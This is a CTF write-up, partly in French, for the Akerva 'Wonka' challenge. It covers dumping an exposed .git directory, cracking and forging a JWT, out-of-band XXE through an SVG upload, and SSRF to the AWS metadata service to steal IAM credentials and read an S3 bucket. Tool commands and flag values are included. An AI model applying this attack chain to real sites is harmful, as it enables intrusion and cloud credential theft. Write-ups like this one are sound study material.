# Wonka Chall

> Akerva

> https://willywonka.shop

## Step 1

More detail: ['Step1'](./step1.md)

1. dirsearch -> .git
2. GitTools -> dumper -> extractor
3. Flag 1 dans .git/COMMIT_EDITMSG

> 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009

## Step 2

More detail: ['Step2'](./step2.md)

1. trouver le debug=1 dans le .git
2. aller sur la page /reset
3. bf les user -> trouver test
4. https://willywonka.shop/reset?debug=1 -> un jwt + backend.willywonka.shop dans la stacktrace
5. dirsearch sur le backend -> on trouve encore un /reset -> /reset?debug=1 -> set cookie : backend-session=jwt vide
6. bf avec rockyou le secret du jwt qu'on récup dans la stacktrace -> s3cr3t
7. refaire un jwt sur jwt.io avec un compte validateur (genre aas) et une expiration lointaine -> https://backend.willywonka.shop/reset/jwt_craft 
8. faire la meme que etape 4 mais avec le user aas pour se co avec
9. chercher le ticket "deadbeef" et flag

> 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318

## Step 3

More detail: ['Step3'](./step3.md)

1. réussir à trig la xxe via svg : [rest.svg](./step3/rect.svg)
2. upload [ro.svg](./step3/ro.svg) à l'adresse : http://willywonka.shop/profile?filetype=image%2fsvg%2bxml ==> XXE OOB
3. mettre `aas` en nom de victime et du garbage pour le reste
4. copier coller l'id du ticket dans le backend -> les logs du python server commencent à bouger
5. cliquer sur autoresize

> 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630

## Step 4

More detail: ['Step4'](./step4.md)

1. pour chopper les creds du bucket, il faut taper sur http://169.254.169.254/latest/meta-data/iam/security-credentials/ grâce à la xxe
2. récupérer les infos du bucket : http://169.254.169.254/latest/dynamic/instance-identity/document
3. set les variables d'env : AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN
4. aws s3 ls s3://willywonka-shop
5. aws s3 cp s3://willywonka-shop/Flag-04.txt .

> 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528

## Resources

1. GitTools : https://github.com/internetwache/GitTools.git
2. Seclist, username shortlist : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
3. jwt checker : https://jwt.io/
4. jwt_tool : https://github.com/ticarpi/jwt_tool
5. jwt encoder / decoder : https://www.jsonwebtoken.io/
6. lfi and ssrf via xxe : https://hackerone.com/reports/347139
7. xxe oob : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
8. s3 bucket ssrf metadata : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/

---

## Useful command used

* dirsearch

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://willywonka.shop/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25
```

* gittools

```bash
/opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ git_out
/opt/t/pentest/exploit/GitTools/Extractor/extractor.sh git_out git_extract
```

* jwt_tool

```bash
python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt
```